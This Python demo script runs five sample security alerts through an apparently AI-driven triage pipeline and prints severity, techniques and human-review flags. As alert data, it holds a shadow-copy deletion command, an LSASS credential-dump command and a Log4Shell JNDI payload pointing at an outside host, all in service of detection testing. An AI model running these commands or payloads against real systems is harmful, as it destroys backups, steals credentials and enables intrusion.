from __future__ import annotations
"""
AgentReliabilityLab — Demo Script
Runs 5 representative alerts through the pipeline and prints color-coded results.
"""
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

DEMO_ALERTS = [
    {
        "id":     "DEMO-001",
        "label":  "Ransomware — vssadmin shadow deletion",
        "source": "EDR",
        "text": (
            '{"event_type":"process","process_name":"vssadmin.exe",'
            '"command_line":"vssadmin.exe delete shadows /all /quiet",'
            '"parent_process":"cmd.exe","user":"SYSTEM","endpoint_id":"WIN-DC-01"}'
        ),
    },
    {
        "id":     "DEMO-002",
        "label":  "Credential Dump — LSASS via ProcDump",
        "source": "EDR",
        "text": (
            '{"event_type":"process","process_name":"procdump64.exe",'
            '"command_line":"procdump64.exe -ma lsass.exe lsass.dmp",'
            '"parent_process":"powershell.exe","user":"Administrator"}'
        ),
    },
    {
        "id":     "DEMO-003",
        "label":  "Log4Shell exploitation attempt",
        "source": "IDS",
        "text": (
            "IDS ALERT — CVE-2021-44228 Log4Shell Exploitation Attempt. "
            "Source IP: 203.0.113.42. Target: PROD-APP-01:8080. "
            "Payload: ${jndi:ldap://203.0.113.42:1389/Exploit}. HTTP 200 returned."
        ),
    },
    {
        "id":     "DEMO-004",
        "label":  "RDP lateral movement",
        "source": "IDS",
        "text": (
            "IDS ALERT: 6 RDP connections from 10.0.1.55 to different hosts "
            "in 3 minutes. User: CORP\\svc_backup. NTLM auth."
        ),
    },
    {
        "id":     "DEMO-005",
        "label":  "Benign — scheduled CI/CD deployment",
        "source": "Syslog",
        "text": (
            "Accepted publickey for deploy from 10.0.0.5. "
            "Scheduled CI/CD deployment service account."
        ),
    },
]

_COLORS = {
    "CRITICAL": "\033[1;31m",  # bold red
    "HIGH":     "\033[0;31m",  # red
    "MEDIUM":   "\033[0;33m",  # yellow
    "LOW":      "\033[0;34m",  # blue
    "BENIGN":   "\033[0;32m",  # green
    "UNKNOWN":  "\033[0;37m",  # grey
}
_RESET = "\033[0m"


def _color(severity: str, text: str) -> str:
    return f"{_COLORS.get(severity, '')}{text}{_RESET}"


def run_demo():
    from pipeline.graph import run_pipeline

    print("\n" + "="*62)
    print("  AgentReliabilityLab — Cyber Alert Triage Demo")
    print("="*62 + "\n")

    for demo in DEMO_ALERTS:
        print(f"  [{demo['id']}] {demo['label']}  (source: {demo['source']})")
        print(f"  Alert: {demo['text'][:80]}...")

        t0    = time.time()
        state = run_pipeline(demo["text"], alert_id=demo["id"])
        elapsed = time.time() - t0

        decision   = state.get("triage_decision",   "UNKNOWN")
        band       = state.get("confidence_band",   "?")
        score      = state.get("confidence_score",  0.0)
        analysis   = state.get("analysis", {})
        tech_ids   = analysis.get("technique_ids", [])
        tactics    = analysis.get("tactics", [])
        rationale  = analysis.get("severity_rationale", "")[:120]
        controls   = analysis.get("recommended_controls", [])[:2]
        reasons    = state.get("reason_codes", [])
        human      = state.get("human_review_required", False)
        audit_id   = state.get("audit_id", "—")
        tl         = state.get("token_log", {})
        error      = state.get("error")

        print(f"\n  Decision  : {_color(decision, decision)}")
        if error:
            print(f"  Error     : {error}")
        else:
            print(f"  Confidence: {score:.0%} ({band})")
            print(f"  Techniques: {', '.join(tech_ids) or 'none'}")
            print(f"  Tactics   : {', '.join(tactics) or 'none'}")
            print(f"  Rationale : {rationale or '—'}")
            print(f"  Controls  : {'; '.join(controls) or 'none'}")
            print(f"  Reasons   : {', '.join(reasons)}")
            print(f"  Human rev : {'YES ⚠' if human else 'No'}")
        print(f"  Audit ID  : {audit_id}")
        print(f"  Latency   : {elapsed:.1f}s | "
              f"Tokens: {tl.get('total_tokens', 0)}")
        print("-"*62 + "\n")


if __name__ == "__main__":
    run_demo()
